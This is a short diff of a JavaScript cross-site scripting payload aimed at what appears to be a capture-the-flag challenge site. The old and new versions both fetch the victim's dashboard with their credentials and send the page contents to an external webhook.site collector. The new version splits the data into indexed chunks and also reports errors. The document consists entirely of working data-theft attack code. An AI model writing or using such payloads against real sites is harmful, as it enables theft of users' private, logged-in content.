@@ -1,6 +1,19 @@
 <script>
- fetch('https://inst-f1d2c3160fbbf924-love-notes.chal.crewc.tf/dashboard', { credentials: 'include' })
-  .then(r=>r.text())
-  .then(t=> new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?d='+encodeURIComponent(t.slice(0,1900)))
-  .catch(e=> new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?err='+encodeURIComponent(String(e)));
+(async ()=>{
+  try{
+    const r = await fetch('https://inst-f1d2c3160fbbf924-love-notes.chal.crewc.tf/dashboard', { credentials: 'include' });
+    const text = await r.text();
+    const max = 1800; // safe chunk size
+    for (let i = 0; i < text.length; i += max) {
+      const chunk = text.slice(i, i + max);
+      // Include index and total-ish indicator so you can reassemble
+      new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?p=/api/notes&i='
+        + (i / max) + '&d=' + encodeURIComponent(chunk);
+      // small delay can help in flaky headless envs, but optional
+      await new Promise(r=>setTimeout(r, 50));
+    }
+  } catch (e) {
+    new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?err=' + encodeURIComponent(String(e));
+  }
+})();
 </script>
